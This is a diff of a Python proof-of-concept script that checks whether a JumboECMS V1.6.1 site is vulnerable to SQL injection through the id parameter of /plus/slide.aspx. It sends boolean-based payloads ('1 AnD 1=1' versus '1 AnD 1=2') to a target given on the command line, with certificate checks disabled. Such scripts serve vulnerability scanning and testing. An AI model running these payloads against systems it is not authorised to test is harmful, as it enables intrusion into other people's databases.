@@ -9,20 +9,13 @@ description: 文件/plus/slide.aspx参数id存在SQL注入。
 import sys
 import requests
 import warnings
-
-  
-
-class slide_id_sqli:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['JumboECMS V1.6.1 注入漏洞','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
             }
-        trueurl = self.url + "/plus/slide.aspx?id=1%20AnD%201=1"
-        falseurl = self.url + "/plus/slide.aspx?id=1%20AnD%201=2"
+        trueurl = url + "/plus/slide.aspx?id=1%20AnD%201=1"
+        falseurl = url + "/plus/slide.aspx?id=1%20AnD%201=2"
         try:
             req1 = requests.get(trueurl, headers=headers, timeout=10, verify=False)
             req2 = requests.get(falseurl, headers=headers, timeout=10, verify=False)
@@ -38,5 +31,4 @@ class slide_id_sqli:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = slide_id_sqli(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
